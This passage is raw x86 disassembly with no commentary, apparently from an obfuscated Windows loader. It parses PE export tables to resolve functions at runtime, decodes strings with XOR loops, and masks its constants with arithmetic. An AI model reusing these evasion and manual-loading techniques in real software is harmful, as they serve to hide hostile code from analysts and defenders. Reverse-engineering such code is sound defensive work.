  426d18:	cmp    cx,WORD PTR [ebp-0x10]
  426d1c:	sete   al
  426d1f:	jmp    0x426d03
  426d21:	push   ebp
  426d22:	mov    ebp,esp
  426d24:	sub    esp,0x50
  426d27:	push   edi
  426d28:	mov    edi,eax
  426d2a:	mov    eax,DWORD PTR [edi+0x1a8]
  426d30:	cmp    DWORD PTR [eax],0x0
  426d33:	jne    0x426d3c
  426d35:	xor    eax,eax
  426d37:	jmp    0x426e6d
  426d3c:	push   DWORD PTR [ebp+0x8]
  426d3f:	push   0x2c
  426d41:	pop    eax
  426d42:	call   0x426ad1
  426d47:	mov    edx,DWORD PTR [edi+0x1ac]
  426d4d:	lea    eax,[edi+0x22]
  426d50:	mov    DWORD PTR [ebp-0x4c],eax
  426d53:	lea    eax,[edi+0x44]
  426d56:	mov    DWORD PTR [ebp-0x48],eax
  426d59:	lea    eax,[edi+0x66]
  426d5c:	mov    DWORD PTR [ebp-0x44],eax
  426d5f:	lea    eax,[edi+0x88]
  426d65:	mov    DWORD PTR [ebp-0x40],eax
  426d68:	lea    eax,[edi+0xaa]
  426d6e:	mov    DWORD PTR [ebp-0x3c],eax
  426d71:	lea    eax,[edi+0xcc]
  426d77:	mov    DWORD PTR [ebp-0x38],eax
  426d7a:	lea    eax,[edi+0xee]
  426d80:	mov    DWORD PTR [ebp-0x34],eax
  426d83:	lea    eax,[edi+0x110]
  426d89:	mov    DWORD PTR [ebp-0x30],eax
  426d8c:	lea    eax,[edi+0x132]
  426d92:	mov    DWORD PTR [ebp-0x2c],eax
  426d95:	lea    eax,[edi+0x154]
  426d9b:	push   edi
  426d9c:	mov    DWORD PTR [ebp-0x50],edi
  426d9f:	mov    DWORD PTR [ebp-0x28],eax
  426da2:	call   0x426ea1
  426da7:	push   eax
  426da8:	mov    eax,DWORD PTR [edi+0x1a8]
  426dae:	push   DWORD PTR [eax]
  426db0:	call   0x426b42
  426db5:	mov    DWORD PTR [ebp-0x10],eax
  426db8:	test   eax,eax
  426dba:	je     0x426e6d
  426dc0:	mov    ecx,DWORD PTR [eax+0x3c]
  426dc3:	push   ebx
  426dc4:	push   esi
  426dc5:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  426dc9:	add    esi,eax
  426dcb:	mov    edi,DWORD PTR [esi+0x24]
  426dce:	mov    ecx,DWORD PTR [esi+0x1c]
  426dd1:	mov    edx,DWORD PTR [esi+0x20]
  426dd4:	mov    ebx,DWORD PTR [esi+0x18]
  426dd7:	add    edi,eax
  426dd9:	mov    DWORD PTR [ebp-0x20],edi
  426ddc:	mov    edi,DWORD PTR [esi+0x14]
  426ddf:	add    ecx,eax
  426de1:	add    edx,eax
  426de3:	mov    DWORD PTR [ebp-0xc],ecx
  426de6:	mov    DWORD PTR [ebp-0x1c],edx
  426de9:	mov    DWORD PTR [ebp-0x8],edi
  426dec:	cmp    edi,ebx
  426dee:	ja     0x426df3
  426df0:	mov    DWORD PTR [ebp-0x8],ebx
  426df3:	xor    ebx,ebx
  426df5:	mov    DWORD PTR [ebp-0x18],ebx
  426df8:	cmp    DWORD PTR [ebp-0x8],ebx
  426dfb:	jbe    0x426e6b
  426dfd:	jmp    0x426e02
  426dff:	mov    edx,DWORD PTR [ebp-0x1c]
  426e02:	mov    edi,DWORD PTR [ebp-0x20]
  426e05:	movzx  edi,WORD PTR [edi+ebx*2]
  426e09:	cmp    ebx,DWORD PTR [esi+0x18]
  426e0c:	jae    0x426e6b
  426e0e:	cmp    edi,DWORD PTR [esi+0x14]
  426e11:	jae    0x426e6b
  426e13:	mov    ebx,DWORD PTR [edx+ebx*4]
  426e16:	mov    edx,DWORD PTR [ebp+0x8]
  426e19:	mov    edi,DWORD PTR [ecx+edi*4]
  426e1c:	mov    DWORD PTR [ebp-0x4],edx
  426e1f:	lea    edx,[ebp-0x50]
  426e22:	add    ebx,eax
  426e24:	add    edi,eax
  426e26:	sub    edx,DWORD PTR [ebp+0x8]
  426e29:	mov    DWORD PTR [ebp-0x14],0xb
  426e30:	mov    DWORD PTR [ebp-0x24],edx
  426e33:	mov    edx,DWORD PTR [ebp-0x4]
  426e36:	cmp    DWORD PTR [edx],0x0
  426e39:	jne    0x426e56
  426e3b:	mov    eax,DWORD PTR [ebp-0x24]
  426e3e:	push   DWORD PTR [eax+edx*1]
  426e41:	push   ebx
  426e42:	call   0x426c3c
  426e47:	mov    ecx,DWORD PTR [ebp-0xc]
  426e4a:	test   eax,eax
  426e4c:	je     0x426e53
  426e4e:	mov    eax,DWORD PTR [ebp-0x4]
  426e51:	mov    DWORD PTR [eax],edi
  426e53:	mov    eax,DWORD PTR [ebp-0x10]
  426e56:	add    DWORD PTR [ebp-0x4],0x4
  426e5a:	dec    DWORD PTR [ebp-0x14]
  426e5d:	jne    0x426e33
  426e5f:	mov    ebx,DWORD PTR [ebp-0x18]
  426e62:	inc    ebx
  426e63:	mov    DWORD PTR [ebp-0x18],ebx
  426e66:	cmp    ebx,DWORD PTR [ebp-0x8]
  426e69:	jb     0x426dff
  426e6b:	pop    esi
  426e6c:	pop    ebx
  426e6d:	pop    edi
  426e6e:	leave  
  426e6f:	ret    0x4
  426e72:	push   ebp
  426e73:	mov    ebp,esp
  426e75:	mov    eax,DWORD PTR [ebp+0x8]
  426e78:	push   esi
  426e79:	push   DWORD PTR [eax+0x1e0]
  426e7f:	lea    esi,[eax+0x198]
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	call   0x426d21
  426e8d:	mov    ecx,DWORD PTR [esi]
  426e8f:	mov    DWORD PTR [ecx],eax
  426e91:	mov    eax,DWORD PTR [esi]
  426e93:	xor    ecx,ecx
  426e95:	cmp    DWORD PTR [eax],ecx
  426e97:	pop    esi
  426e98:	setne  cl
  426e9b:	mov    eax,ecx
  426e9d:	pop    ebp
  426e9e:	ret    0x4
  426ea1:	mov    ecx,DWORD PTR [edi+0x188]
  426ea7:	push   ebx
  426ea8:	jmp    0x426ebd
  426eaa:	xor    eax,0x8a9b
  426eaf:	add    eax,0x3b5d
  426eb4:	mov    WORD PTR [ecx],ax
  426eb7:	add    ecx,0x2
  426eba:	add    edx,0x2
  426ebd:	movzx  eax,WORD PTR [edx]
  426ec0:	mov    ebx,0x4e38
  426ec5:	cmp    ax,bx
  426ec8:	jne    0x426eaa
  426eca:	xor    eax,eax
  426ecc:	mov    WORD PTR [ecx],ax
  426ecf:	mov    eax,DWORD PTR [edi+0x188]
  426ed5:	pop    ebx
  426ed6:	ret    
  426ed7:	push   edi
  426ed8:	mov    edi,eax
  426eda:	mov    eax,DWORD PTR [esi+0x188]
  426ee0:	shl    edi,0x6
  426ee3:	add    eax,edi
  426ee5:	jmp    0x426ef1
  426ee7:	xor    cl,0x7f
  426eea:	add    cl,0x4
  426eed:	mov    BYTE PTR [eax],cl
  426eef:	inc    eax
  426ef0:	inc    edx
  426ef1:	mov    cl,BYTE PTR [edx]
  426ef3:	cmp    cl,0x83
  426ef6:	jne    0x426ee7
  426ef8:	mov    BYTE PTR [eax],0x0
  426efb:	mov    eax,DWORD PTR [esi+0x188]
  426f01:	add    eax,edi
  426f03:	pop    edi
  426f04:	ret    
  426f05:	push   ebp
  426f06:	mov    ebp,esp
  426f08:	sub    esp,0x14
  426f0b:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  426f12:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  426f19:	mov    eax,DWORD PTR [ebx]
  426f1b:	mov    DWORD PTR [ebp-0x8],eax
  426f1e:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  426f25:	push   esi
  426f26:	push   edi
  426f27:	mov    DWORD PTR [ebp-0x14],0xead71885
  426f2e:	mov    edi,DWORD PTR [ebp-0x4]
  426f31:	mov    ecx,DWORD PTR [ebp-0x10]
  426f34:	mov    eax,0x75108af
  426f39:	xor    edi,eax
  426f3b:	mov    edx,0x3272f6
  426f40:	xor    ecx,eax
  426f42:	add    edi,edx
  426f44:	add    ecx,edx
  426f46:	imul   edi,ecx
  426f49:	jmp    0x426f91
  426f4b:	mov    ecx,DWORD PTR [ebp-0x8]
  426f4e:	mov    esi,DWORD PTR [ebp-0x4]
  426f51:	xor    ecx,eax
  426f53:	xor    esi,eax
  426f55:	add    ecx,edx
  426f57:	add    esi,edx
  426f59:	test   esi,ecx
  426f5b:	mov    esi,DWORD PTR [ebp-0x8]
  426f5e:	mov    ecx,DWORD PTR [ebp-0x4]
  426f61:	je     0x426f78
  426f63:	xor    ecx,eax
  426f65:	xor    esi,eax
  426f67:	add    ecx,edx
  426f69:	add    esi,edx
  426f6b:	shr    esi,cl
  426f6d:	mov    ecx,DWORD PTR [ebp-0x14]
  426f70:	xor    ecx,eax
  426f72:	add    ecx,edx
  426f74:	xor    esi,ecx
  426f76:	jmp    0x426f82
  426f78:	xor    esi,eax
  426f7a:	xor    ecx,eax
  426f7c:	add    esi,edx
  426f7e:	add    ecx,edx
  426f80:	shr    esi,cl
  426f82:	mov    DWORD PTR [ebp-0x8],esi
  426f85:	mov    ecx,DWORD PTR [ebp-0x4]
  426f88:	xor    ecx,eax
  426f8a:	lea    edi,[edi+ecx*1+0x3272f6]
  426f91:	mov    ecx,DWORD PTR [ebp-0xc]
  426f94:	mov    esi,DWORD PTR [ebp-0x4]
  426f97:	xor    esi,eax
  426f99:	xor    ecx,eax
  426f9b:	sub    ecx,esi
  426f9d:	cmp    edi,ecx
  426f9f:	jbe    0x426f4b
  426fa1:	mov    eax,DWORD PTR [ebp-0x8]
  426fa4:	pop    edi
  426fa5:	mov    DWORD PTR [ebx],eax
  426fa7:	mov    eax,DWORD PTR [ebp-0x8]
  426faa:	pop    esi
  426fab:	leave  
  426fac:	ret    
  426fad:	push   ebp
  426fae:	mov    ebp,esp
  426fb0:	sub    esp,0x38
  426fb3:	push   ebx
  426fb4:	mov    ebx,0xf89c85a5
  426fb9:	mov    DWORD PTR [ebp-0x4],ebx
  426fbc:	lea    ecx,[ebx-0x1]
  426fbf:	mov    DWORD PTR [ebp-0x24],ecx
  426fc2:	mov    eax,DWORD PTR [ebp-0x4]
  426fc5:	mov    edx,DWORD PTR [ebp+0x8]
  426fc8:	push   esi
  426fc9:	mov    esi,0x75108af
  426fce:	xor    eax,esi
  426fd0:	push   edi
  426fd1:	mov    edi,0x3272f6
  426fd6:	add    eax,edi
  426fd8:	cmp    edx,eax
  426fda:	mov    eax,DWORD PTR [ebp-0x4]
  426fdd:	je     0x427142
  426fe3:	mov    edx,DWORD PTR [ebp+0xc]
  426fe6:	xor    eax,esi
  426fe8:	add    eax,edi
  426fea:	cmp    edx,eax
  426fec:	je     0x42713f
  426ff2:	mov    eax,DWORD PTR [ebp+0x10]
  426ff5:	mov    edx,DWORD PTR [ebp+0xc]
  426ff8:	mov    DWORD PTR [ebp-0x14],eax
  426ffb:	mov    eax,DWORD PTR [ebp+0x8]
  426ffe:	mov    DWORD PTR [ebp-0x18],0xf89c853c
  427005:	mov    DWORD PTR [ebp-0xc],eax
  427008:	lea    eax,[ebx-0x2]
  42700b:	mov    DWORD PTR [ebp-0x1c],eax
  42700e:	mov    DWORD PTR [ebp-0x10],ebx
  427011:	mov    DWORD PTR [ebp+0xc],ecx
  427014:	mov    DWORD PTR [ebp+0x10],eax
  427017:	mov    eax,DWORD PTR [ebp+0xc]
  42701a:	xor    eax,esi
  42701c:	mov    DWORD PTR [ebp-0x20],edx
  42701f:	sub    edx,eax
  427021:	sub    edx,edi
  427023:	mov    DWORD PTR [ebp+0x8],edx
  427026:	mov    DWORD PTR [ebp-0x8],0xf89c85a0
  42702d:	jmp    0x42712f
  427032:	mov    eax,DWORD PTR [ebp+0xc]
  427035:	mov    ecx,DWORD PTR [ebp+0xc]
  427038:	xor    eax,esi
  42703a:	xor    ecx,esi
  42703c:	lea    ecx,[eax+ecx*1+0x64e5ec]
  427043:	mov    eax,DWORD PTR [ebp+0x8]
  427046:	xor    edx,edx
  427048:	div    ecx
  42704a:	mov    eax,DWORD PTR [ebp+0x10]
  42704d:	mov    ecx,DWORD PTR [ebp+0xc]
  427050:	xor    eax,esi
  427052:	xor    ecx,esi
  427054:	sub    eax,ecx
  427056:	cmp    edx,eax
  427058:	jne    0x4270ee
  42705e:	mov    eax,DWORD PTR [ebp+0x8]
  427061:	mov    ecx,DWORD PTR [ebp-0xc]
  427064:	mov    dl,BYTE PTR [eax+ecx*1]
  427067:	mov    eax,DWORD PTR [ebp-0x10]
  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
